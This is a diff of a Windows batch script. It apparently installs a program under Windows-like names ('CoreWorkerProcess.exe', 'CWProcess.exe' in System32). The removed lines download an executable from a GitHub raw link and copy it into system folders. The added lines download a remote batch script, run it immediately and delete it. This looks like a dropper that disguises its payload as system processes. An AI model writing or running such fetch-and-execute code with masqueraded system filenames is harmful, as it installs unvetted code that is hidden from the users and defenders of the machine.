@@ -372,49 +372,25 @@ if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
 )
 
 
-:INSTCOREPROCESS
 
-:: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+:: Run commands if CoreWorkerProcess.exe is not found
+echo Checking for CoreWorkerProcess...
+set "embeddedScript=temp_script_CWP.bat"
 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
 
-
-
-:: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
     echo.
-    echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto INSTCOREPROCESS
-)
-
-
-
-
-
-:: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
-
-
-
-:: Check if the file size is at least 80KB (81920 bytes)
-if %FILESIZE% geq 81920 (
-    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%SystemRoot%\System32\CWProcess.exe"
+    echo.
 ) else (
-echo.
-    echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto INSTCOREPROCESS
+    echo Filed to get content from ShellHost Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckCWP
 )
 
 
